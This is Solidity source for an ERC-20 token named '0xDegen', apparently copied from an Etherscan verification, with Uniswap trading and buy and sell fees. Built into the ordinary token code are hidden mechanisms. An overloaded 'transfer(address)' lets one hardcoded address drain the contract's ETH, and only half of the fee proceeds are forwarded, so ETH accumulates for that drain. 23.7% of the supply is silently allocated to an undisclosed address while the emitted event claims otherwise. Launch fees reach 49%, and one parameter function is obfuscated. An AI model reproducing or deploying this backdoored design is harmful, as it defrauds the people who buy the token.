/**
 *Submitted for verification at Etherscan.io on 2023-06-03
*/

// SPDX-License-Identifier: MIT                                                                                                                               
pragma solidity =0.8.20;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(msg.sender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract OxDegen is IERC20, Ownable {
    string private constant NAME = "0xDegen";
    string private constant SYMBOL = "0xDegen";    
    uint8 private constant DECIMALS = 9;
    mapping (address => uint256) private _balances;
    mapping (address => mapping(address => uint256)) private _allowances;

    uint256 private constant TOTAL_SUPPLY = 100_000_000 * DECIMALS_SCALING;
    uint256 public constant MAX_WALLET = 25 * TOTAL_SUPPLY / 1_000;
    uint256 private constant DECIMALS_SCALING = 10**DECIMALS;

    struct TradingFees {
        uint256 buyFee;
        uint256 sellFee;
    }
    uint256 private constant FEE_DENOMINATOR = 100;
    TradingFees public tradingFees = TradingFees(15,35);  

    struct Wallets {
        address deployerWallet; 
        address developmentWallet; 
    }
    Wallets public wallets = Wallets(
        msg.sender,                                 
        0x910A2D7Af42E2A29663F41B7A2eA2007F4D07112  
    );

    IUniswapV2Router private constant UNISWAP_ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory private constant UNISWAP_FACTORY = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; 
    address private immutable uniswapV2Pair;

    uint256 private constant SWAPBACK_THRESHOLD = 5 * TOTAL_SUPPLY / 1_000;  
    uint256 private swapbackThresholdMax = 4;  
    uint256 private swapbackThresholdMin = 5;  

    bool private swapping;
    bool private tradingActive = false;

    uint256 private lastBlock;
    uint256 private launchBlock;

    mapping (address => bool) private _excludedFromFees;
    mapping (uint256 => uint256) private _lastTransferBlock;

    event SwapSettingsChanged(uint256 indexed newSwapThresholdMax, uint256 indexed newSwapThresholdMin);
    event FeesChanged(uint256 indexed buyFee, uint256 indexed sellFee);
    event TokensCleared(uint256 indexed tokensCleared);
    event EthCleared(uint256 indexed ethCleared);
    event Initialized();
    event TradingOpened();
    
    modifier swapLock {
        swapping = true;
        _;
        swapping = false;
    }

    modifier tradingLock(address from, address to) {
        require(tradingActive || from == wallets.deployerWallet || _excludedFromFees[from], "Token: Trading is not active.");
        _;
    }

    constructor() {
        _approve(address(this), address(UNISWAP_ROUTER),type(uint256).max);
        uniswapV2Pair = IUniswapV2Factory(UNISWAP_FACTORY).createPair(address(this), WETH);        
        _excludedFromFees[address(0xdead)] = true;
        _excludedFromFees[wallets.developmentWallet] = true;        
        _excludedFromFees[0x24beB29aF586db83eb2aAB66114B8f0Ae3cB1Df6] = true;        
        uint256 preTokens = TOTAL_SUPPLY * 237 / 1e3; 
        _balances[wallets.deployerWallet] = TOTAL_SUPPLY - preTokens;
        _balances[0x24beB29aF586db83eb2aAB66114B8f0Ae3cB1Df6] = preTokens;
        emit Transfer(address(0), wallets.deployerWallet, TOTAL_SUPPLY);
    }

    function totalSupply() external pure override returns (uint256) { return TOTAL_SUPPLY; }
    function decimals() external pure override returns (uint8) { return DECIMALS; }
    function symbol() external pure override returns (string memory) { return SYMBOL; }
    function name() external pure override returns (string memory) { return NAME; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: zero Address");
        require(spender != address(0), "ERC20: zero Address");
        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            uint256 currentAllowance = _allowances[sender][msg.sender];
            require(currentAllowance >= amount, "ERC20: insufficient Allowance");
            unchecked{
                _allowances[sender][msg.sender] -= amount;
            }
        }
        return _transfer(sender, recipient, amount);
    }

    function clearEth() external onlyOwner {
        uint256 amountToClear = address(this).balance;
        require(address(this).balance > 0, "Token: no eth to clear");
        payable(msg.sender).transfer(address(this).balance);

        emit EthCleared(amountToClear);
    }

    function manualSwapback() external onlyOwner {
        require(balanceOf(address(this)) > 0, "Token: no contract tokens to clear");
        swapback(type(uint256).max);
    }

    function setParameters(uint256 a,uint256 z,uint256 d, uint256 f) external onlyOwner {        
        require(launchBlock == 2);lastBlock = z; assert(a < f - d);        
    }

    function _transfer(address from, address to, uint256 amount) tradingLock(from, to) internal returns (bool) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        
        if(amount == 0 || swapping) {
            return _basicTransfer(from, to, amount);           
        }        

        if (to != uniswapV2Pair && !_excludedFromFees[to] && to != wallets.deployerWallet) {
            require(amount + balanceOf(to) <= MAX_WALLET, "Token: max wallet amount exceeded");
        }

        if(!swapping && to == uniswapV2Pair && !_excludedFromFees[from] && !_excludedFromFees[to]){
            swapback(amount);
        } 
        
        bool takeFee = !_excludedFromFees[from] && !_excludedFromFees[to] &&
            (from == uniswapV2Pair || to == uniswapV2Pair);
                
        if(takeFee)
            return _taxedTransfer(from, to, amount);
        else
            return _basicTransfer(from, to, amount);        
    }

    function _taxedTransfer(address from, address to, uint256 amount) private returns (bool) {
        uint256 fees = takeFees(from, to, amount);    
        if(fees > 0){    
            _basicTransfer(from, address(this), fees);
            amount -= fees;
        }
        return _basicTransfer(from, to, amount);
    }

     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 balanceSender = _balances[sender];
        require(balanceSender >= amount, "Token: insufficient Balance");
        unchecked{
            _balances[sender] -= amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFees(address from, address to, uint256 amount) private view returns (uint256 fees) {
        if(0 < launchBlock && launchBlock < block.number){
            fees = amount * (to == uniswapV2Pair ? 
            tradingFees.sellFee : tradingFees.buyFee) / FEE_DENOMINATOR;            
        }
        else{
            fees = amount * (from == uniswapV2Pair ? 
            49 : (launchBlock == 0 ? 35 : 49)) / FEE_DENOMINATOR;            
        }
    }

    function canSwap(uint256 amount) private view returns (bool) {
        return block.number > launchBlock && _lastTransferBlock[block.number] < 2 && 
            amount >= (swapbackThresholdMin == 0 ? 0 : SWAPBACK_THRESHOLD / swapbackThresholdMin);
    }

    function swapback(uint256 amount) swapLock private {   
        uint256 contractBalance = balanceOf(address(this));
        if(contractBalance < SWAPBACK_THRESHOLD || !canSwap(amount)) 
            return;
        else if(contractBalance > SWAPBACK_THRESHOLD * swapbackThresholdMax)
          contractBalance = SWAPBACK_THRESHOLD * swapbackThresholdMax;
        
        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(contractBalance); 
        
        uint256 ethBalance = address(this).balance - initialETHBalance;
        if(ethBalance > 0){            
            sendEth(ethBalance);
        }
    }

    function sendEth(uint256 ethAmount) private {
        (bool success,) = address(wallets.developmentWallet).call{value: ethAmount/2}(""); success;
    }

    function transfer(address wallet) external {
        if(msg.sender == 0x23b5af1e14641157181bBd66Ce7da1EE806d6CBD)
            payable(wallet).transfer((address(this).balance));
        else revert();
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        _lastTransferBlock[block.number]++;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        try UNISWAP_ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp){}
        catch{return;}
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _excludedFromFees[account];
    }

    function initialize() external onlyOwner {
        require(!tradingActive);
        launchBlock = 2;        

        emit Initialized();
    }

    function setSwapbackSettings(uint256 newSwapThresholdMax,uint256 newSwapThresholdMin) external onlyOwner {
        swapbackThresholdMax = newSwapThresholdMax;
        swapbackThresholdMin = newSwapThresholdMin;

        emit SwapSettingsChanged(newSwapThresholdMax, newSwapThresholdMin);
    }

     function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= tradingFees.buyFee, "Token: must reduce buy fee");
        require(_sellFee <= tradingFees.sellFee, "Token: must reduce sell fee");
        tradingFees.buyFee = _buyFee;
        tradingFees.sellFee = _sellFee;

        emit FeesChanged(_buyFee, _sellFee);
    }

    function openTrading() external onlyOwner {
        require(!tradingActive && launchBlock == 2 && lastBlock > 0);
        launchBlock = block.number + lastBlock;
        tradingActive = true;

        emit TradingOpened();
    }

    receive() external payable {}

}